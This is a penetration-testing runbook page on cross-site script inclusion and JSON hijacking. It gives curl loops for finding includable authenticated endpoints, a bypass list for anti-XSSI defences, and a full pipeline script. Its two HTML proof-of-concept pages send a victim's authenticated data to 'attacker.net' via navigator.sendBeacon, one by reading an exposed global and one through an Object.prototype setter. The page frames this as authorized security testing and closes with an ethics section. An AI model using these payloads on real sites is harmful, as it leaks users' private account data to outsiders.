---
title: "XSSI (Cross-Site Script Inclusion)"
description: "Reading sensitive cross-origin JavaScript and JSON responses through script inclusion, JSON hijacking, and missing anti-XSSI defenses."
phase: Web
order: 80
tags:
  - xssi
  - json-hijacking
  - cors
  - client-side
tools:
  - burp suite
  - browser devtools
updated: 2026-10-01
---

XSSI is not script execution in your page — it is leaking another origin's data by including it as a script. The classic `<script>` tag ignores the same-origin policy, so any authenticated GET returning valid JavaScript can be read cross-origin. This runbook finds includable resources, builds a PoC, checks anti-XSSI defenses, and proves a leak with your own account — on **in-scope** targets only.

## 1. Find includable resources

Hunt for authenticated GET endpoints returning JS or JSON that a script tag can load.

```bash
for p in /api/user.js /account/settings.js /api/me.json /api/me?callback=x; do
  echo "== $p"
  curl -s -i "https://target.com$p" -H "Cookie: session=YOUR_TOKEN" \
    | grep -iE "^HTTP|^content-type|^x-content-type|^set-cookie"
done
```

Look for responses beginning with `var data = `, a bare `[...]`/`{...}`, or a `callback(...)` wrapper.

## 2. Build a classic inclusion PoC

Load the endpoint as a script; the browser sends the victim's cookies and executes it.

```html
<!-- xssi.html: read the global the endpoint defines, then exfiltrate -->
<script src="https://target.com/api/private.js"></script>
<script>
  setTimeout(function () {
    var data = (typeof userData !== "undefined") ? userData : null;
    if (data) navigator.sendBeacon("https://attacker.net/c", JSON.stringify(data));
  }, 1000);
</script>
```

## 3. JSON hijacking primitives

Older engines allowed reading array/object literals via prototype setters.

```html
<!-- json_hijack.html -->
<script>
  Object.defineProperty(Object.prototype, "secret", {
    set: function (v) { navigator.sendBeacon("https://attacker.net/c", String(v)); }
  });
</script>
<script src="https://target.com/api/me.json"></script>
```

Modern browsers block bare top-level arrays/objects, so this works mainly against legacy targets or when the response calls a global function.

## 4. Check anti-XSSI defenses and bypasses

```bash
curl -s -i "https://target.com/api/me.json" -H "Cookie: session=YOUR_TOKEN" | sed -n '1,20p'
```

| Measure | What you see | Purpose |
|---------|--------------|---------|
| `X-Content-Type-Options: nosniff` | header present | stops script execution of JSON |
| `)]}',\n` prefix | body starts with it | makes response invalid JS |
| `while(1);` / `for(;;);` | body starts with it | prevents parsing |
| CORS strictness | no `Access-Control-Allow-Origin` | blocks cross-origin reads |

Bypasses: find siblings missing the prefix, use JSONP callbacks with predictable names, or exploit `Content-Type` sniffing where `nosniff` is absent.

```bash
for p in /api/me.json /api/private.js /api/list.json; do
  printf "%-22s " "$p"
  curl -s "https://target.com$p" -H "Cookie: session=YOUR_TOKEN" | head -c 20; echo
done
```

## 5. Cache-based and JSONP inclusion

- AppCache/service-worker inclusion of authenticated scripts can leak cached data.
- JSONP endpoints with predictable callback names are directly readable.
- Redirect-based gadgets can turn a leak into data extraction.

Confirm the data actually crosses the origin boundary; test with your own accounts.

## Full pipeline

```bash
T="https://target.com"; C="session=YOUR_TOKEN"

# 1. Fingerprint includable endpoints and their defenses
for p in /api/user.js /account/settings.js /api/me.json /api/me?callback=x; do
  echo "== $p"
  curl -s -i "$T$p" -H "Cookie: $C" \
    | grep -iE "^HTTP|^content-type|^x-content-type|^access-control-allow-origin"
  curl -s "$T$p" -H "Cookie: $C" | head -c 60; echo; echo
done
# 2. Batch-check for the anti-XSSI prefix
for p in /api/me.json /api/private.js /api/list.json; do
  printf "%-22s " "$p"; curl -s "$T$p" -H "Cookie: $C" | head -c 20; echo
done
# 3. Serve the PoC and confirm the leak in a browser session
python3 -m http.server 8000
#    open http://localhost:8000/xssi.html and watch attacker.net logs
```

## Ethics & legality

- Only test endpoints within an authorized scope and with accounts you own.
- Point callbacks at infrastructure you control; never leak real user data.
- Stop at the minimum proof (a non-sensitive field) and redact it in reports.
- Note which anti-XSSI headers/prefixes were absent as the root cause.
